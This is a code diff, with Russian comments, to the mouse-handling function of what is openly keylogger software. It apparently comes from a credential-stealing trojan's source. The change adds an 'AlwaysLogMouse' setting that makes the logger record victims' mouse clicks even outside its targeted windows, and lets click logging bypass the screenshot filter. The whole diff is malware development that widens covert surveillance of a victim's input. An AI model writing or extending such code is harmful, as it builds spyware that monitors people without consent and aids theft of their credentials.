@@ -790,14 +790,15 @@ void ProcessMouseMessage(PMSG Msg)
 	if (Logger == NULL || (Msg->wParam & MK_LBUTTON) == 0)
 		return;
 
+	int AlwaysLogMouse = KLG.System ? KLG.System->AlwaysLogMouse : 0;
 
 	// Проверяем необходимость записи кликов
-	if (Msg->hwnd == Logger->ActiveWND && KLG.Filter)
+	if ((Msg->hwnd == Logger->ActiveWND && KLG.Filter) || AlwaysLogMouse)
 	{
-		bool LogClick = KLG.Filter->LogClicks && ((KLG.Filter->Actions & LOG_MOUSE) == 0);
+		bool LogClick = AlwaysLogMouse == LOG_MOUSE_NOT_SCREENSHOT || (KLG.Filter->LogClicks && ((KLG.Filter->Actions & LOG_MOUSE) == 0));
 		if (LogClick)
 		{
-        	if (!KLG.StopLogging)
+       		if (!KLG.StopLogging)
 				KeyLogger::AddStrToBuffer(NULL, (PCHAR)KeyLogger::StrClick, 0);
 			return;
 		}
@@ -808,11 +809,11 @@ void ProcessMouseMessage(PMSG Msg)
 	bool ValidWnd = KeyLogger::SetActiveWnd(Msg->hwnd, LOG_MOUSE);
 
 
-	if (!ValidWnd || KLG.Filter == NULL || KLG.Filter->DontSaveMouseLog || KLG.StopLogging)
+	if (!ValidWnd || KLG.Filter == NULL || KLG.Filter->DontSaveMouseLog || KLG.StopLogging || AlwaysLogMouse == 0)
 	{
 		KeyLogger::IncActionCounter();
 		return;
-    }
+	}
 
 	// Определяем координаты нажатия
 	DWORD Width  = KLG.Filter->Data.SSWidth;
